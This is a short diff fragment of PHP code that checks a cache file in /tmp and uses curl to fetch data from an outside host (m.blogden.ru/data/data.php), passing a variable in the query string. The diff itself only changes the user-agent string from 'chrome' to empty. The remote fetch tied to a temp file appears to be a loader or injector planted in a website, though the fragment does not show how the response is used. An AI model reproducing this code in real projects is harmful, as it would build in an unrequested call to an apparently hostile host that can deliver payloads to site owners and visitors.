@@ -8,7 +8,7 @@ if(filesize('/tmp/bvbaccrac'.$d)) { } else {
  curl_setopt_array($curl3, [
     CURLOPT_RETURNTRANSFER => 1,
     CURLOPT_URL => 'https://m.blogden.ru/data/data.php?s='.$d.'',
-    CURLOPT_USERAGENT => 'chrome'
+    CURLOPT_USERAGENT => ''
 ]);
  $resp3 = curl_exec($curl3);
  curl_close($curl3);	
